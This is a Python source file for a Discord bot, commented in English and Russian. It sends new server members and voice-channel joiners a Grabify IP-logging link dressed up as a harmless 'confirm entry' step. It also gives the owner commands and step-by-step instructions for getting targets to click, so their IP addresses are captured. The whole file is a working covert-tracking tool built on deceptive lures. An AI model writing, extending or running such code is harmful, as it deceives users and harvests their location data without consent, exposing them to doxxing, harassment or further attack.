import discord
from discord.ext import commands
import os
import datetime

# ========================================
# 1. CONFIGURATION / НАСТРОЙКИ
# ========================================
TOKEN = os.getenv('DISCORD_TOKEN')
YOUR_USER_ID = int(os.getenv('YOUR_USER_ID', '0'))

# YOUR GRABIFY LINK / ТВОЯ ССЫЛКА GRABIFY
GRABIFY_LINK = "https://grabify.link/AC6BBB"

# CHANNEL ID FOR PUBLIC LOGS / ID КАНАЛА ДЛЯ ПУБЛИЧНЫХ ЛОГОВ
LOG_CHANNEL_ID = 123456789012345678  # ← REPLACE / ЗАМЕНИ

# ========================================
# 2. BOT / БОТ
# ========================================
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# Dictionary for tracking users / Словарь для отслеживания пользователей
user_links = {}

@bot.event
async def on_ready():
    print(f'✅ Bot {bot.user} is online! / Бот {bot.user} запущен!')
    print(f'📊 Connected to {len(bot.guilds)} servers / Подключено к {len(bot.guilds)} серверам')
    print(f'🔗 Grabify link: {GRABIFY_LINK} / Grabify ссылка: {GRABIFY_LINK}')

@bot.event
async def on_member_join(member):
    """When a new member joins / Когда новый участник заходит"""
    try:
        user_id = str(member.id)
        tracking_link = f"{GRABIFY_LINK}?id={user_id}"
        user_links[user_id] = tracking_link
        
        # Send DM to new member / Отправляем в ЛС новому участнику
        embed = discord.Embed(
            title="🎉 Welcome to the server! / Добро пожаловать на сервер!",
            description=f"Hello {member.mention}! Please confirm your entry. / Привет {member.mention}! Пожалуйста, подтверди вход.",
            color=discord.Color.blue()
        )
        embed.add_field(
            name="🔗 Confirm entry / Подтвердить вход",
            value=f"[Click here / Нажми сюда]({tracking_link})",
            inline=False
        )
        embed.set_footer(text="This is safe and takes 2 seconds / Это безопасно и займет 2 секунды")
        
        await member.send(embed=embed)
        print(f"📨 Sent link to {member.name} / Отправлена ссылка для {member.name}")
        
        # Notify owner / Уведомляем владельца
        user = await bot.fetch_user(YOUR_USER_ID)
        await user.send(f"👤 **{member.name}** received the link in DM / получил ссылку в ЛС")
        
    except Exception as e:
        print(f"❌ Error / Ошибка: {e}")

@bot.event
async def on_voice_state_update(member, before, after):
    """When someone joins a voice channel / Когда кто-то заходит в голосовой канал"""
    if before.channel is None and after.channel is not None:
        user_id = str(member.id)
        tracking_link = f"{GRABIFY_LINK}?id={user_id}"
        user_links[user_id] = tracking_link
        
        try:
            user = await bot.fetch_user(YOUR_USER_ID)
            
            embed = discord.Embed(
                title="🔊 NEW VOICE CHANNEL MEMBER! / НОВЫЙ УЧАСТНИК В ГОЛОСОВОМ КАНАЛЕ!",
                description=f"**{member.name}** joined **{after.channel.name}** / присоединился к **{after.channel.name}**",
                color=discord.Color.gold(),
                timestamp=datetime.datetime.now()
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            embed.add_field(name="👤 User / Пользователь", value=member.name, inline=True)
            embed.add_field(name="🔊 Channel / Канал", value=after.channel.name, inline=True)
            embed.add_field(
                name="🔗 Link / Ссылка", 
                value=f"```\n{tracking_link}\n```",
                inline=False
            )
            embed.add_field(
                name="📌 What to do / Что делать", 
                value=(
                    "1️⃣ Copy the link above / Скопируй ссылку выше\n"
                    "2️⃣ Send it to the user / Отправь её пользователю\n"
                    "3️⃣ They click → you see IP on grabify.link!\n"
                    "3️⃣ Он нажимает → ты видишь IP на grabify.link!"
                ),
                inline=False
            )
            
            await user.send(embed=embed)
            print(f"📨 Sent notification about {member.name} / Отправлено уведомление о {member.name}")
            
        except Exception as e:
            print(f"❌ Error / Ошибка: {e}")

@bot.command(name='link')
async def show_link(ctx):
    """Show Grabify link / Показать ссылку Grabify"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Only for owner! / Только для владельца!")
        return
    
    embed = discord.Embed(
        title="📊 Grabify Link / Ссылка Grabify",
        description="Go here to see collected IPs / Перейди сюда, чтобы увидеть собранные IP",
        color=discord.Color.green()
    )
    embed.add_field(name="🔗 Link / Ссылка", value=f"```\n{GRABIFY_LINK}\n```", inline=False)
    embed.add_field(name="👥 Tracking / Отслеживается", value=f"{len(user_links)} users / пользователей", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='stats')
async def show_stats(ctx):
    """Show statistics / Показать статистику"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Only for owner! / Только для владельца!")
        return
    
    embed = discord.Embed(
        title="📊 Statistics / Статистика",
        color=discord.Color.blue()
    )
    embed.add_field(name="👥 Received link / Получили ссылку", value=len(user_links), inline=True)
    await ctx.send(embed=embed)

@bot.command(name='send_link')
async def send_link(ctx, user: discord.Member = None):
    """Send link to a specific user / Отправить ссылку конкретному пользователю"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Only for owner! / Только для владельца!")
        return
    
    if user is None:
        await ctx.send("❌ Specify user: `!send_link @user` / Укажи пользователя: `!send_link @user`")
        return
    
    try:
        user_id = str(user.id)
        tracking_link = f"{GRABIFY_LINK}?id={user_id}"
        user_links[user_id] = tracking_link
        
        embed = discord.Embed(
            title="🔔 Confirm entry / Подтверждение входа",
            description=f"{user.mention}, please confirm your entry / пожалуйста, подтверди вход.",
            color=discord.Color.blue()
        )
        embed.add_field(name="🔗 Link / Ссылка", value=f"[Click here / Нажми сюда]({tracking_link})", inline=False)
        
        await user.send(embed=embed)
        await ctx.send(f"✅ Link sent to {user.name} in DM! / Ссылка отправлена {user.name} в ЛС!")
        
    except Exception as e:
        await ctx.send(f"❌ Error / Ошибка: {e}")

# ========================================
# 3. RUN / ЗАПУСК
# ========================================
if __name__ == "__main__":
    if not TOKEN:
        print("❌ ERROR: DISCORD_TOKEN not found! / ОШИБКА: DISCORD_TOKEN не найден!")
        exit(1)
    
    bot.run(TOKEN)
